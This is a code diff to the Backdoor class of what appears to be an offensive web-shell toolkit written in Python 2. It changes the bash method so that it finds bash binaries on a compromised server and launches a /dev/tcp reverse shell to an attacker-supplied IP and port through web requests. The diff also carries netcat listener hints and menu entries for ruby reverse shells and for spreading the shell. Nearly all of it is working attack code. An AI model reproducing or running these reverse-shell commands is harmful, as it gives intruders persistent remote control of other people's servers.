@@ -1,8 +1,9 @@
-from platform import platform as os
-from subprocess import Popen, PIPE
+import string
 
-import random, string
-import base64, itertools
+from subprocess import Popen, PIPE
+from random import choice
+from itertools import product
+from base64 import b64encode
 
 from core.libs.menu import Colors, getargs
 from core.libs.request_handler import make_request
@@ -31,12 +32,25 @@ class Backdoor(object):
         print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
         print '[i] \tspread  \t\tSpread this shell around'
         #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'
-    def bash(self,ip,port):
-	path = "/bin/bash"
-	raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
-	cmd = 'nohup {0} -c \'/bin/bash -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
-	make_request.get_page_source(cmd)
-	print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+
+    def bash(self, ip, port):
+        cmd = "for x in `whereis bash`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
+        bash = make_request.get_page_source(cmd)
+        if bash:
+            print '\n{0}[i] Found bash:{1}'.format(Colors.GREEN, Colors.END)
+            c = 1
+            for path in bash:
+                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                c += 1
+            msg = '\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\''
+            msg += '{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})'
+            msg += '\n{3}[?] Press <return> when ready!{4}'
+            raw_input(msg.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            for path in bash:
+                cmd = 'nohup {0} -c \'{0} -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
+                make_request.get_page_source(cmd)
+            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+
     def msf(self, ip, port):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
@@ -75,7 +89,6 @@ class Backdoor(object):
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!] Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)
-
 
     def perl(self, ip, port):
         cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
